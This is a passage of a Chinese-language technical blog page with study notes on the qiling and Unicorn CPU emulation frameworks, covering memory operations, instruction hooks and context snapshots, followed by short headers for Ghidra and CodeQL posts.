<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">callback_address</span>(<span class="params">ql: qiling.Qiling</span>):</span><br><span class="line">    address_to_map = <span class="number">0x123456780000</span></span><br><span class="line">    <span class="keyword">if</span> ql.mem.is_mapped(address_to_map, <span class="number">0x2000</span>):</span><br><span class="line">        <span class="keyword">return</span></span><br><span class="line">    ql.mem.<span class="built_in">map</span>(address_to_map, <span class="number">0x2000</span>, UC_PROT_READ | UC_PROT_WRITE)</span><br><span class="line">    ql.mem.protect(address_to_map, <span class="number">0x1000</span>, UC_PROT_READ)</span><br><span class="line">    addresses: <span class="built_in">list</span>[<span class="built_in">int</span>] = ql.mem.search(re.<span class="built_in">compile</span>(<span class="string">b&quot;[a-zA-Z0-9]&#123;4,&#125;\0&quot;</span>), <span class="number">0x400000</span>, <span class="number">0x500000</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;\n&#x27;</span>.join(<span class="string">f&quot;<span class="subst">&#123;<span class="built_in">hex</span>(x)&#125;</span> <span class="subst">&#123;ql.mem.string(x)&#125;</span>&quot;</span> <span class="keyword">for</span> x <span class="keyword">in</span> addresses))</span><br><span class="line">    ql.mem.unmap(address_to_map, <span class="number">0x2000</span>)</span><br></pre></td></tr></table></figure>
<p>qiling 支持对内存进行映射、解除映射、搜索等操作。如上，<code>ql.mem.is_mapped</code>可查询某地址开始往后一段空间是否已经被映射，<code>ql.mem.protect</code>用于修改某段内存的权限，<code>ql.mem.search</code>可查询某段内存中的值并返回所有查询结果，查询可使用字节数组或正则表达式。<code>ql.mem.string</code>可便捷地提取内存中某个地址开始的字符串，但字符串中不可包含不可打印字符。</p>
<p>部分输出结果：</p>
<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">0x4ad2c7 ENOCSI</span><br><span class="line">0x4ad2ce EL2HLT</span><br><span class="line">0x4ad2d5 EBADE</span><br><span class="line">0x4ad2db EBADR</span><br><span class="line">0x4ad2e1 EXFULL</span><br><span class="line">0x4ad2e8 ENOANO</span><br><span class="line">0x4ad2ef EBADRQC</span><br><span class="line">0x4ad2f7 EBADSLT</span><br><span class="line">0x4ad2ff EBFONT</span><br><span class="line">0x4ad306 ENONET</span><br><span class="line">0x4ad30d ENOPKG</span><br><span class="line">0x4ad314 EADV</span><br></pre></td></tr></table></figure>
<h2 id="a7-pack"><a class="markdownIt-Anchor" href="#a7-pack"></a> A.7 pack</h2>
<p>qiling 支持整数类型与字符数组的相互转化，甚至还能够将字符数组转化为 C 语言的结构体。字符数组与结构体的转化是通过 Python 自带模块实现的，规则参考 <a target="_blank" rel="noopener" href="https://docs.python.org/3/library/struct.html#module-struct">Python 文档</a>。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">print</span>(emu.pack8(<span class="number">0x12</span>))          <span class="comment"># unpack 将字符数组转化为整数</span></span><br><span class="line"><span class="built_in">print</span>(emu.pack16(<span class="number">0x1234</span>))</span><br><span class="line"><span class="built_in">print</span>(emu.pack32(<span class="number">0x12345678</span>))</span><br><span class="line"><span class="built_in">print</span>(emu.pack64(<span class="number">0x1234567890abcdef</span>))</span><br><span class="line"><span class="built_in">print</span>(emu.pack8s(-<span class="number">0x12</span>))        <span class="comment"># 有符号值</span></span><br><span class="line"><span class="built_in">print</span>(emu.pack16s(-<span class="number">0x1234</span>))</span><br><span class="line"><span class="built_in">print</span>(emu.pack32s(-<span class="number">0x12345678</span>))</span><br><span class="line"><span class="built_in">print</span>(emu.pack64s(-<span class="number">0x1234567890abcdef</span>))</span><br></pre></td></tr></table></figure>
<p>输出：</p>
<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">b&#x27;\x12&#x27;</span><br><span class="line">b&#x27;4\x12&#x27;</span><br><span class="line">b&#x27;xV4\x12&#x27;</span><br><span class="line">b&#x27;\xef\xcd\xab\x90xV4\x12&#x27;</span><br><span class="line">b&#x27;\xee&#x27;</span><br><span class="line">b&#x27;\xcc\xed&#x27;</span><br><span class="line">b&#x27;\x88\xa9\xcb\xed&#x27;</span><br><span class="line">b&#x27;\x112To\x87\xa9\xcb\xed&#x27;</span><br></pre></td></tr></table></figure>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
    <link itemprop="mainEntityOfPage" href="http://hornos3.github.com/2024/08/02/Unicorn-%E5%AD%A6%E4%B9%A0/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="CoLin">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="CoLin's BLOG">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2024/08/02/Unicorn-%E5%AD%A6%E4%B9%A0/" class="post-title-link" itemprop="url">Unicorn 学习</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">发表于</span>
              

              <time title="创建时间：2024-08-02 08:57:23 / 修改时间：15:16:14" itemprop="dateCreated datePublished" datetime="2024-08-02T08:57:23+08:00">2024-08-02</time>
            </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-folder"></i>
              </span>
              <span class="post-meta-item-text">分类于</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/" itemprop="url" rel="index"><span itemprop="name">学习笔记</span></a>
                </span>
                  ，
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E5%B7%A5%E5%85%B7/" itemprop="url" rel="index"><span itemprop="name">工具</span></a>
                </span>
            </span>

          <br>
            <span class="post-meta-item" title="本文字数">
              <span class="post-meta-item-icon">
                <i class="far fa-file-word"></i>
              </span>
                <span class="post-meta-item-text">本文字数：</span>
              <span>5.4k</span>
            </span>
            <span class="post-meta-item" title="阅读时长">
              <span class="post-meta-item-icon">
                <i class="far fa-clock"></i>
              </span>
                <span class="post-meta-item-text">阅读时长 &asymp;</span>
              <span>5 分钟</span>
            </span>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <p>Unicorn 是一个常用的模拟执行框架，能够方便地完成常用 OS 二进制文件的模拟执行。它不仅能够应用于 CTF 解题，在学术界也是重要的基础工具。目前，Unicorn 的最晚发行版本发行于2022年末，目前似乎已经停止维护，但它是多个功能更加全面的模拟器（如 qiling ）的基础。因此有必要进行学习。</p>
<p>下面，我们通过几个代码示例学习 Unicorn Python API 的使用。</p>
<h1 id="1-hello-unicorn"><a class="markdownIt-Anchor" href="#1-hello-unicorn"></a> 1. Hello-Unicorn</h1>
<p>这个示例来自官方文档。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> unicorn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> unicorn.x86_const <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment"># code to be emulated</span></span><br><span class="line">X86_CODE32 = <span class="string">b&quot;\x41\x4a&quot;</span>    <span class="comment"># INC ecx; DEC edx</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># memory address where emulation starts</span></span><br><span class="line">ADDRESS = <span class="number">0x1000000</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;Emulate i386 code&quot;</span>)</span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">    <span class="comment"># Initialize emulator in X86-32bit mode</span></span><br><span class="line">    mu = Uc(UC_ARCH_X86, UC_MODE_32)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># map 2MB memory for this emulation</span></span><br><span class="line">    mu.mem_map(ADDRESS, <span class="number">2</span> * <span class="number">1024</span> * <span class="number">1024</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># write machine code to be emulated to memory</span></span><br><span class="line">    mu.mem_write(ADDRESS, X86_CODE32)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># initialize machine registers</span></span><br><span class="line">    mu.reg_write(UC_X86_REG_ECX, <span class="number">0x1234</span>)</span><br><span class="line">    mu.reg_write(UC_X86_REG_EDX, <span class="number">0x7890</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># emulate code in infinite time &amp; unlimited instructions</span></span><br><span class="line">    mu.emu_start(ADDRESS, ADDRESS + <span class="built_in">len</span>(X86_CODE32))</span><br><span class="line"></span><br><span class="line">    <span class="comment"># now print out some registers</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;Emulation done. Below is the CPU context&quot;</span>)</span><br><span class="line"></span><br><span class="line">    r_ecx = mu.reg_read(UC_X86_REG_ECX)</span><br><span class="line">    r_edx = mu.reg_read(UC_X86_REG_EDX)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&#x27;&gt;&gt;&gt; ECX = 0x<span class="subst">&#123;r_ecx:x&#125;</span>&#x27;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;&gt;&gt;&gt; EDX = 0x<span class="subst">&#123;r_edx:x&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">except</span> UcError <span class="keyword">as</span> e:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;ERROR: %s&quot;</span> % e)</span><br></pre></td></tr></table></figure>
<ul>
<li><code>from unicorn.x86_const import *</code>：在 unicorn 中定义有针对不同架构的枚举定义文件，其中为该架构的所有寄存器、指令赋予一个整数值便于表示。后面的<code>UC_X86_REG_ECX</code>即为引用 x86_const.py 中的常量。</li>
<li><code>Uc(UC_ARCH_X86, UC_MODE_32)</code>：实例化一个模拟器对象，这个类的构造函数只有 2 个参数，没有其他任何可选参数。只需要指定架构和运行模式即可。这里是以 x86 架构，32 位模式构建一个模拟器。</li>
<li><code>mem_map(ADDRESS, 2 * 1024 * 1024)</code>：为一个对象映射一块新的内存空间。这个方法有3个参数，分别为地址、长度、权限（默认为 RWX ）。</li>
<li><code>mem_write(ADDRESS, X86_CODE32)</code>：在一个地址处写入内容。</li>
<li><code>reg_write(UC_X86_REG_ECX, 0x1234)</code>：为一个寄存器写入值。</li>
<li><code>emu_start(ADDRESS, ADDRESS + len(X86_CODE32))</code>：开始执行模拟器，该方法有 4 个参数，分别为开始地址、结束地址、超时（默认为0）、指令数量（默认为0，为0时将执行所有可执行的指令）。</li>
<li><code>reg_read(UC_X86_REG_ECX)</code>：读取寄存器<code>ecx</code>的值。</li>
</ul>
<p>由于 Unicorn 仅实现了最为基础的模拟仿真功能，因此它具备轻量级的优势，API 规范很少，理解起来较为简单。</p>
<h1 id="2-instruction-hooks"><a class="markdownIt-Anchor" href="#2-instruction-hooks"></a> 2. Instruction-Hooks</h1>
<p>这个示例选自Unicorn仓库内的测试代码。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> unicorn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> unicorn.x86_const <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">X86_CODE64_SYSCALL = <span class="string">b&#x27;\x0f\x05&#x27;</span> <span class="comment"># SYSCALL</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># memory address where emulation starts</span></span><br><span class="line">ADDRESS = <span class="number">0x1000000</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;Emulate x86_64 code with &#x27;syscall&#x27; instruction&quot;</span>)</span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">    <span class="comment"># Initialize emulator in X86-64bit mode</span></span><br><span class="line">    mu = Uc(UC_ARCH_X86, UC_MODE_64)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># map 2MB memory for this emulation</span></span><br><span class="line">    mu.mem_map(ADDRESS, <span class="number">2</span> * <span class="number">1024</span> * <span class="number">1024</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># write machine code to be emulated to memory</span></span><br><span class="line">    mu.mem_write(ADDRESS, X86_CODE64_SYSCALL)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">hook_syscall</span>(<span class="params">mu, user_data</span>):</span><br><span class="line">        rax = mu.reg_read(UC_X86_REG_RAX)</span><br><span class="line">        <span class="keyword">if</span> rax == <span class="number">0x100</span>:</span><br><span class="line">            mu.reg_write(UC_X86_REG_RAX, <span class="number">0x200</span>)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&#x27;ERROR: was not expecting rax=%d in syscall&#x27;</span> % rax)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># hook interrupts for syscall</span></span><br><span class="line">    mu.hook_add(UC_HOOK_INSN, hook_syscall, <span class="literal">None</span>, <span class="number">1</span>, <span class="number">0</span>, UC_X86_INS_SYSCALL)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># syscall handler is expecting rax=0x100</span></span><br><span class="line">    mu.reg_write(UC_X86_REG_RAX, <span class="number">0x100</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="comment"># emulate machine code in infinite time</span></span><br><span class="line">        mu.emu_start(ADDRESS, ADDRESS + <span class="built_in">len</span>(X86_CODE64_SYSCALL))</span><br><span class="line">    <span class="keyword">except</span> UcError <span class="keyword">as</span> e:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;ERROR: %s&quot;</span> % e)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># now print out some registers</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;&gt;&gt;&gt; Emulation done. Below is the CPU context&quot;</span>)</span><br><span class="line"></span><br><span class="line">    rax = mu.reg_read(UC_X86_REG_RAX)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;&gt;&gt;&gt; RAX = 0x<span class="subst">&#123;rax:x&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">except</span> UcError <span class="keyword">as</span> e:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;ERROR: %s&quot;</span> % e)</span><br></pre></td></tr></table></figure>
<ul>
<li><code>hook_add(UC_HOOK_INSN, hook_syscall, None, 1, 0, UC_X86_INS_SYSCALL)</code>：在执行过程中添加 hook。参数列表：
<ul>
<li><code>htype</code>：hook 类型。Unicorn 可以对很多程序行为添加 Hook，包括指定指令、指定基本块、指定内存行为等。可以在 unicorn_const.py 中查看所有<code>UC_HOOK</code>开头的常数定义。</li>
<li><code>callback</code>：回调函数，即 hook 函数。</li>
<li><code>user_data</code>：用于回调函数的所有参数。</li>
<li><code>begin</code>：Hook 能够触发的开始 PC。</li>
<li><code>end</code>：Hook 能够触发的结束 PC。</li>
<li><code>arg1</code>/<code>arg2</code>：与 Hook 相关的参数，如对于<code>UC_HOOK_INSN</code>，则只需要<code>arg1</code>指定特定的指令类型。</li>
</ul>
</li>
</ul>
<h1 id="3-snapshot"><a class="markdownIt-Anchor" href="#3-snapshot"></a> 3. Snapshot</h1>
<p>这个示例选自Unicorn仓库内的测试代码。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> unicorn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> unicorn.x86_const <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;Save/restore CPU context in opaque blob&quot;</span>)</span><br><span class="line">address = <span class="number">0</span></span><br><span class="line">code = <span class="string">b&#x27;\x40&#x27;</span>  <span class="comment"># inc eax</span></span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">    <span class="comment"># Initialize emulator</span></span><br><span class="line">    mu = Uc(UC_ARCH_X86, UC_MODE_32)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># map 8KB memory for this emulation</span></span><br><span class="line">    mu.mem_map(address, <span class="number">8</span> * <span class="number">1024</span>, UC_PROT_ALL)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># write machine code to be emulated to memory</span></span><br><span class="line">    mu.mem_write(address, code)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># set eax to 1</span></span><br><span class="line">    mu.reg_write(UC_X86_REG_EAX, <span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;&gt;&gt;&gt; Running emulation for the first time&quot;</span>)</span><br><span class="line">    mu.emu_start(address, address+<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;&gt;&gt;&gt; Emulation done. Below is the CPU context&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;&gt;&gt;&gt; EAX = 0x%x&quot;</span> %(mu.reg_read(UC_X86_REG_EAX)))</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;&gt;&gt;&gt; Saving CPU context&quot;</span>)</span><br><span class="line">    saved_context = mu.context_save()</span><br><span class="line"></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;&gt;&gt;&gt; Pickling CPU context&quot;</span>)</span><br><span class="line">    pickled_saved_context = pickle.dumps(saved_context)</span><br><span class="line"></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;&gt;&gt;&gt; Running emulation for the second time&quot;</span>)</span><br><span class="line">    mu.emu_start(address, address+<span class="number">1</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;&gt;&gt;&gt; Emulation done. Below is the CPU context&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;&gt;&gt;&gt; EAX = 0x%x&quot;</span> %(mu.reg_read(UC_X86_REG_EAX)))</span><br><span class="line"></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;&gt;&gt;&gt; Unpickling CPU context&quot;</span>)</span><br><span class="line">    saved_context = pickle.loads(pickled_saved_context)</span><br><span class="line"></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;&gt;&gt;&gt; Modifying some register.&quot;</span>)</span><br><span class="line">    saved_context.reg_write(UC_X86_REG_EAX, <span class="number">0xc8c8</span>)</span><br><span class="line"></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;&gt;&gt;&gt; CPU context restored. Below is the CPU context&quot;</span>)</span><br><span class="line">    mu.context_restore(saved_context)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;&gt;&gt;&gt; EAX = 0x%x&quot;</span> %(mu.reg_read(UC_X86_REG_EAX)))</span><br><span class="line"></span><br><span class="line"><span class="keyword">except</span> UcError <span class="keyword">as</span> e:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;ERROR: %s&quot;</span> % e)</span><br></pre></td></tr></table></figure>
<ul>
<li><code>context_save</code>：保存当前位置的所有上下文信息，这里使用<code>pickle</code>库是为了将保存的内容进行序列化。</li>
<li><code>context_restore</code>：将上下文信息载入到当前执行环境中。本示例表明上下文信息可以在不同次执行中相互使用。</li>
</ul>
<h1 id="4-其他-api"><a class="markdownIt-Anchor" href="#4-其他-api"></a> 4. 其他 API</h1>
<ul>
<li><code>mem_protect</code>：设置某段地址的访问权限。参数有地址、长度、权限类型。</li>
<li><code>hook_del</code>：删除某个 Hook。</li>
<li><code>mem_regions</code>：返回当前模拟器的内存状态，返回的是一个生成器，每次调用<code>next</code>后获取一个内存区域的地址、长度与权限。</li>
<li><code>ctl_xxx</code>：一系列方法，用于获取/设置一些配置，如内存、架构等。</li>
<li><code>mmio_map</code>：映射一块用于 IO 的内存空间。包含 6 个参数：
<ul>
<li><code>address</code>：起始地址</li>
<li><code>size</code>：大小</li>
<li><code>read_cb</code>：用于读的回调函数</li>
<li><code>user_data_read</code>：传递给读回调函数的用户自定义数据</li>
<li><code>write_cb</code>：用于写的回调函数</li>
<li><code>user_data_write</code>：传递给写回调函数的用户自定义数据</li>
</ul>
</li>
<li><code>query</code>：查询引擎内部状态，只有 1 个参数表示查询的对象，可查询架构、处理器模式、超时时间、内存页大小，使用<code>UC_QUERY_xxx</code>形式传入</li>
</ul>
<p>可以看出，Unicorn 轻量到甚至没有实现自行加载 ELF 文件的 API，更多地是用于调试。在实际使用中，它不如以其为基础的更为成熟的仿真工具好用。</p>
<p>下面是一位 Android 大神的 blog，其中包含了开发基于 Unicorn 的简易调试器与 Android so 库的加载器：<a target="_blank" rel="noopener" href="https://bbs.kanxue.com/thread-253868.htm">链接</a></p>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
    <link itemprop="mainEntityOfPage" href="http://hornos3.github.com/2024/07/19/Ghidra%E4%BD%BF%E7%94%A8%E6%8C%87%E5%8C%97/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="CoLin">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="CoLin's BLOG">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2024/07/19/Ghidra%E4%BD%BF%E7%94%A8%E6%8C%87%E5%8C%97/" class="post-title-link" itemprop="url">Ghidra使用指北</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">发表于</span>
              

              <time title="创建时间：2024-07-19 10:10:20 / 修改时间：10:15:24" itemprop="dateCreated datePublished" datetime="2024-07-19T10:10:20+08:00">2024-07-19</time>
            </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-folder"></i>
              </span>
              <span class="post-meta-item-text">分类于</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/" itemprop="url" rel="index"><span itemprop="name">学习笔记</span></a>
                </span>
                  ，
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E5%85%B6%E4%BB%96/" itemprop="url" rel="index"><span itemprop="name">其他</span></a>
                </span>
            </span>

          <br>
            <span class="post-meta-item" title="本文字数">
              <span class="post-meta-item-icon">
                <i class="far fa-file-word"></i>
              </span>
                <span class="post-meta-item-text">本文字数：</span>
              <span>30</span>
            </span>
            <span class="post-meta-item" title="阅读时长">
              <span class="post-meta-item-icon">
                <i class="far fa-clock"></i>
              </span>
                <span class="post-meta-item-text">阅读时长 &asymp;</span>
              <span>1 分钟</span>
            </span>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <p>Ghidra 使用指北 PPT上传，包含相关示例附件。<a href="Ghidra_guide.zip">zip链接</a></p>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
    <link itemprop="mainEntityOfPage" href="http://hornos3.github.com/2024/07/08/CodeQL%E5%AD%A6%E4%B9%A0-1/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="CoLin">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="CoLin's BLOG">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2024/07/08/CodeQL%E5%AD%A6%E4%B9%A0-1/" class="post-title-link" itemprop="url">CodeQL学习 (1)</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">发表于</span>

              <time title="创建时间：2024-07-08 20:09:04" itemprop="dateCreated datePublished" datetime="2024-07-08T20:09:04+08:00">2024-07-08</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="far fa-calendar-check"></i>
                </span>
                <span class="post-meta-item-text">更新于</span>
                <time title="修改时间：2024-07-10 20:45:09" itemprop="dateModified" datetime="2024-07-10T20:45:09+08:00">2024-07-10</time>
              </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-folder"></i>
              </span>
              <span class="post-meta-item-text">分类于</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/" itemprop="url" rel="index"><span itemprop="name">学习笔记</span></a>
                </span>
                  ，
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E5%85%B6%E4%BB%96/" itemprop="url" rel="index"><span itemprop="name">其他</span></a>
                </span>
            </span>

          <br>
            <span class="post-meta-item" title="本文字数">
              <span class="post-meta-item-icon">
                <i class="far fa-file-word"></i>
              </span>
                <span class="post-meta-item-text">本文字数：</span>
              <span>8.1k</span>
            </span>
            <span class="post-meta-item" title="阅读时长">
              <span class="post-meta-item-icon">
                <i class="far fa-clock"></i>
              </span>
                <span class="post-meta-item-text">阅读时长 &asymp;</span>
              <span>7 分钟</span>
            </span>

        </div>
      </header>

    
    
    
